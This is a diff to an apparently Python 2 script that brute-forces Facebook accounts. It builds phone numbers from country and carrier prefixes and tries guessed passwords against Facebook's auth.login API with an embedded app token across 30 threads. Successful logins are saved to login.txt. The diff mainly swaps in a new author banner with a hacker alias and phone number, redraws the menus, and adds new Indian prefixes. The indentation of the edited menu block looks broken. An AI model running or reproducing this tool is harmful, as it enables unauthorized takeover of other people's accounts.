@@ -46,9 +46,38 @@ def t():
 
 def cb():
     os.system('clear')
-
-
-logo = '\n\x1b[1;97m--------------------------------------------------\n\x1b[1;95m\n CREATER     : MAFIA-KILLER\n WHATSAPP NO   : +92132197796\n NOT     : DON,T CALL ME ONLY TEXT\n\x1b[1;37m--------------------------------------------------                                '
+##### LOGO #####
+logo='''
+\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•
+\033[1;97m	                                    
+\033[1;97m                      :::!~!!!!!:. 
+\033[1;97m                  .xUHWH!! !!?M88WHX:.
+\033[1;97m                .X*#M@$!!  !X!M$$$$$$WWx:.
+\033[1;97m               :!!!!!!?H! :!$!$$$$$$$$$$8X:
+\033[1;97m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
+\033[1;97m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
+\033[1;91m             ~!~!!!! .: BLACK-KILLER$$$$RMM!
+\033[1;97m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
+\033[1;97m               ~?WuxiW*`   `"#$$$$8!!!!??!!!
+\033[1;97m             :X- M$$$$       `"T#$T~!8$WUXU~
+\033[1;97m            :%`  ~#$$$m:        ~!~ ?$$$$$$
+\033[1;97m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*" 
+\033[1;97m.....   -~~\033[1;91m:<` !    ~?T#$$@@W@*?$$      /`
+\033[1;97mW$@@M!!! .!~~ \033[1;91m!!     .:XUW$W!~ `"~:    :
+\033[1;97m#"~~`.:x%`!!  \033[1;91m!H:   !WM$$$$Ti.: .!WUn+!`
+\033[1;97m:::~:!!`:X~ .:\033[1;92m ?H.!u "$$$B$$$!W:U!T$$M~
+\033[1;97m.~~   :X@!.-~   \033[1;92m?@WTWo("*$$$W$TH$! `
+\033[1;97mWi.~!X$?!-~    : \033[1;92m?$$$B$Wu("**$RM!
+\033[1;97m$R@i.~~ !     :   \033[1;92m~$$$$$B$$en:``    
+\033[1;97m?MXT@Wx.~    :     \033[1;92m~"##*$$$$M~   
+\033[1;47m                  \033[1;31mShuBhamg0sain                \033[1;0m
+\x1b[1;93m--------------------------------------------------------------
+\x1b[1;92m➣  NAME  : Shubhamg0sain
+\x1b[1;91m➣  CYBER NAME : BLACK-KILLER
+\x1b[1;93m➣  WHATSAPP NO     : +919557777030
+\x1b[1;95m➣  WARNING  : DON,T CALL ME ONLY TEXT
+\x1b[1;97m➣  NOTE     : USE FAST 4G SIM NET
+\x1b[1;93m--------------------------------------------------------------
 back = 0
 successful = []
 cpb = []
@@ -57,22 +86,17 @@ id = []
 
 def menu():
     os.system('clear')
-    print logo
-    print
-    print '\x1b[1;90m               [1]\x1b[1;96m  Bangladesh'
-    print '\x1b[1;91m               [2]\x1b[1;93m  USA'
-    print '\x1b[1;94m               [3]\x1b[1;92m  UK'
-    print '\x1b[1;92m               [4] \x1b[1;97m India'
-    print '\x1b[1;93m               [5]\x1b[1;94m  Brazil'
-    print '\x1b[1;94m               [6]\x1b[1;95m  Japan'
-    print '\x1b[1;95m               [7]\x1b[1;98m  Korea'
-    print '\x1b[1;96m               [8]\x1b[1;99m  Italy'
-    print '\x1b[1;97m               [9]\x1b[1;96m  Spain'
-    print '\x1b[1;98m               [10]\x1b[1;92m Poland'
-    print '\x1b[1;99m               [11]\x1b[1;96m Pakistan'
-    print '\x1b[1;90m               [12]\x1b[1;95m Indonisia'
-    print '\x1b[1;91m               [13]\x1b[1;91m Update Tool'
-    print '                [0]\x1b[1;97m  Exit            '
+        print logo
+        print "\033[1;96m⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰\n"
+        print '\033[1;94m[1]\033[1;96m  Bangladesh   \033[1;94m[7]\033[1;96m  Korea'
+        print '\033[1;94m[2]\033[1;93m  USA          \033[1;94m[8]\033[1;93m  Italy'
+        print '\033[1;94m[3]\033[1;96m  UK           \033[1;94m[9]\033[1;96m  Spain'
+        print '\033[1;94m[4] \033[1;93m India        \033[1;94m[10]\033[1;93m Poland'
+        print '\033[1;94m[5]\033[1;96m  Brazil       \033[1;94m[11]\033[1;96m Pakistan'
+        print '\033[1;94m[6]\033[1;93m  Japan        \033[1;94m[12]\033[1;93m Indonisia'
+        print '\033[1;94m[13]\033[1;91m Update XP-TRICKER'
+        print '[0]\033[1;97m  Exit'
+        print "\033[1;96m⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰\n"
 
     action()
 
@@ -80,7 +104,7 @@ def menu():
 def action():
     global cpb
     global oks
-    bch = raw_input('\n\x1b[1;95m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[CHOOSE ANY COUNTRY NUMBER> ☝')
+    bch = raw_input('\n\033[1;91m>>>  ')
     if bch == '':
         print '[!] Fill in correctly'
         action()
@@ -134,8 +158,10 @@ def action():
 
     elif bch == '4':
         os.system('clear')
-        print logo
-        print '954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578'
+        print (logo)
+        print("953, 955, 962, 900, 919, 993, 993, 955, 962, 965, 969, 979, 995, 979, 918, 944, 944, 949, 949, 949, 949, 949")
+        print("800, 812, 817, 817, 817, 840, 875, 885, 895, 833, 833, 833, 850, 898")
+        print("738, 760, 789, 775, 738")
         try:
             c = raw_input(' choose code  : ')
             k = '+91'
@@ -369,7 +395,7 @@ def action():
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass5
+                                print '\x1b[1;32mSucce  ' + k + c + user + '  |  ' + pass5
                                 okb = open('login.txt', 'a')
                                 okb.write(k + c + user + pass5 + '\n')
                                 okb.close()
@@ -385,12 +411,12 @@ def action():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print '\x1b[1;96m\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0'
-    print '[\xe2\x9c\x93] Process Has Been Completed ....'
-    print '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
-    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
+    print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰"
+    print '[✓] Process Has Been Completed ....'
+    print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+    print('[✓] CP File Has Been Saved : save/checkpoint.txt')
     raw_input('\n[Press Enter To Go Back]')
-    os.system('python2 .README.md')
+    os.system('python2 S.py')
 
 
 if __name__ == '__main__':
